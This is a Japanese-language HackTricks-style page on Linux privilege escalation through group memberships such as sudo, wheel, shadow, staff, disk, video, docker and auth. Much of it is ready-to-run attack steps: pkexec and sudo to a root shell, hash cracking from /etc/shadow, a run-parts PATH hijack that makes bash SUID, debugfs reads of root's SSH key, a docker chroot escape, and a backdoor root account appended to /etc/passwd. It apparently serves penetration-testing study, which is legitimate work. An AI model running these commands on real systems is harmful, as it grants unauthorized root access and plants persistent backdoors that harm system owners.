# 興味深いグループ - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**場合によっては**、**デフォルトで（または一部のソフトウェアが必要とするため）**、**/etc/sudoers** ファイル内に以下のような行が見つかることがあります:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
これは、**グループsudoまたはadminに属する任意のユーザーがsudoとして何でも実行できることを意味します**。

もしそうなら、**rootになるには単に次のコマンドを実行すればよい**:
```
sudo su
```
### PE - 方法2

すべての suid バイナリを見つけ、バイナリ **Pkexec** が存在するか確認する:
```bash
find / -perm -4000 2>/dev/null
```
もしバイナリ **pkexec is a SUID binary** を見つけ、あなたが **sudo** または **admin** に属しているなら、`pkexec` を使って sudo としてバイナリを実行できる可能性があります。\
これは通常これらのグループが **polkit policy** の中に含まれているためです。このポリシーは基本的にどのグループが `pkexec` を使えるかを識別します。次のコマンドで確認してください：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
そこではどのグループが**pkexec**を実行できるかが示されており、また一部の linux ディストロではデフォルトで**sudo**や**admin**グループが表示されます。

rootになるには、**次のコマンドを実行します**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
もし **pkexec** を実行しようとして、次のような **エラー** が出る場合:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**permissionsがないのではなく、GUIなしで接続されていないためです**。この問題の回避策はこちら: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。必要なのは**2つの異なる ssh sessions**:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel グループ

**時々**、**デフォルトで** **/etc/sudoers** ファイル内に次の行があります:
```
%wheel	ALL=(ALL:ALL) ALL
```
これは **wheel グループに属する任意のユーザーが sudo として何でも実行できる** ことを意味します。

この場合、**root に昇格するには次を実行するだけです**:
```
sudo su
```
## Shadow グループ

**group shadow** のユーザーは **/etc/shadow** ファイルを **読み取る** ことができます:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
では、ファイルを読み、**crack some hashes** を試みてください。

Quick lock-state nuance when triaging hashes:
- `!` または `*` を含むエントリは、一般的にパスワードログインに対して非対話的です。
- `!hash` は通常、パスワードが設定された後にロックされたことを意味します。
- `*` は通常、有効なパスワードハッシュが設定されたことがないことを意味します。
これは、直接ログインがブロックされている場合でもアカウント分類に役立ちます。

## Staff グループ

**staff**: ユーザーが root 権限を必要とせずにシステムにローカル変更を追加できるようにします（`/usr/local` を参照）。（`/usr/local/bin` にある実行ファイルはどのユーザーの PATH 変数にも含まれており、同名の `/bin` および `/usr/bin` にある実行ファイルを「上書き」する可能性があることに注意してください。）監視/セキュリティにより関連する "adm" グループと比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)

debian ディストリビューションでは、$PATH 変数は `/usr/local/` が最優先で実行されることを示しており、特権ユーザーであってもなくても同様です。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
もし `/usr/local` にあるプログラムをハイジャックできれば、簡単に root を取得できます。

`run-parts` プログラムのハイジャックは簡単に root を取得する方法です。多くのプログラム（crontab、ssh ログイン時など）が `run-parts` のようなものを実行します。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
または新しい ssh session login のとき.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## ディスクグループ

この権限は、マシン内のすべてのデータにアクセスできるため、ほとんど **root accessと同等** です。

ファイル:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
debugfs を使うと **ファイルを書き込む** こともできます。例えば `/tmp/asd1.txt` を `/tmp/asd2.txt` にコピーするには次のようにします:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
しかし、**rootが所有するファイルに書き込み**（`/etc/shadow` や `/etc/passwd` のように）を試みると、"**Permission denied**" エラーになります。

## Video グループ

コマンド `w` を使うと、**誰がシステムにログインしているか**を確認でき、次のような出力が表示されます:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** は、ユーザ **yossi が物理的に端末にログインしている** ことを意味します。

**video group** は画面出力の閲覧権限を持っています。基本的に画面を観察できます。そのためには生データとして **画面の現在のイメージを取得する** 必要があり、画面が使用している解像度を取得する必要があります。画面データは `/dev/fb0` に保存でき、解像度は `/sys/class/graphics/fb0/virtual_size` で確認できます。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**開く**には、**raw image** を **GIMP** で開き、**`screen.raw`** ファイルを選択して、ファイルタイプとして **Raw image data** を選びます：

![](<../../../images/image (463).png>)

次に、Width と Height を画面で使われている値に合わせて変更し、異なる Image Types を試して（画面が最もよく表示されるものを選択してください）：

![](<../../../images/image (317).png>)

## Root グループ

デフォルトでは、**root グループのメンバー**は、いくつかの**サービス**設定ファイルやいくつかの**ライブラリ**ファイル、あるいは特権昇格に使える**その他の興味深いもの**を**変更**できるアクセス権を持っているようです...

**root グループのメンバーが変更できるファイルを確認する**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

ホストマシンの root filesystem をインスタンスのボリュームにマウントできます。インスタンスが起動するとすぐにそのボリュームに `chroot` をロードするため、実質的にマシン上で root を取得できます。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd グループ


{{#ref}}
./
{{#endref}}

## Adm グループ

通常、グループ **`adm`** の**メンバー**は _/var/log/_ 内にあるログファイルを**読み取る**権限を持っています。\
したがって、このグループ内のユーザーを侵害した場合は、必ず**ログを確認**してください。

## Backup / Operator / lp / Mail グループ

これらのグループはしばしば直接rootに繋がるベクトルというより、**credential-discovery** のベクトルであることが多いです:
- **backup**: 設定ファイル、鍵、DB ダンプ、またはトークンを含むアーカイブが露出する可能性があります。
- **operator**: プラットフォーム固有の運用アクセスで、機密性の高いランタイムデータを leak する可能性があります。
- **lp**: 印刷キュー／スプールは文書の内容を含む可能性があります。
- **mail**: メールスプールはリセットリンク、OTP、および内部認証情報を露出する可能性があります。

ここでのメンバーシップは高価値なデータ露出として扱い、password/token reuse を経由して pivot してください。

## Auth グループ

OpenBSD では、**auth** グループは使用されている場合、通常 _**/etc/skey**_ および _**/var/db/yubikey**_ フォルダに書き込みできます。\
これらの権限は、次のエクスプロイトを用いて root に **escalate privileges** するために悪用される可能性があります: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
